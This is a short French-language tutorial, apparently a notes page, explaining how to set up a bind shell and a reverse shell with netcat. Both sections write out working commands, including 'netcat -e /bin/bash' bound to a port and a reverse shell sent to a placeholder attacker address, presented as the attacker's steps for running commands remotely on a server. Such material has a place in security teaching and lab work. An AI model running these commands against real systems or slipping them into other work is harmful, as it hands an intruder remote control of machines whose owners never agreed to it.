## Bind And Reverse shell

## 1️⃣ Bind Shell /Shell de liaison
Pour configurer un "shell de liaison" avec Netcat, nous effectuerons les actions suivantes (dans un terminal linux):

Sur le serveur:

Server@ netcat -v -l -p 3000 -e /bin/bash

le shell bash est lié maintenant au port 3000

Sur le poste Attacker :

Attacker@ netcat IP_SERVER  3000

Et là, l'attaquant, obtient un "shell" sur le serveur que l'on peut exploiter pour lui faire exécuter des commandes à distance.


## 2️⃣ Reverse Shell /Shell inversé

L'attaquant démarre, sur son poste, un processus d'écoute:
Attacker@ netcat -v -l -p 3000

Le serveur renvoie un shell inversé à Attacker :

Server@ netcat IP_ATTACKER 3000 -e /bin/bash

Et là,aussi, l'attaquant, obtient un "shell inversé" sur le serveur que l'on peut exploiter pour lui faire exécuter des commandes à distance.

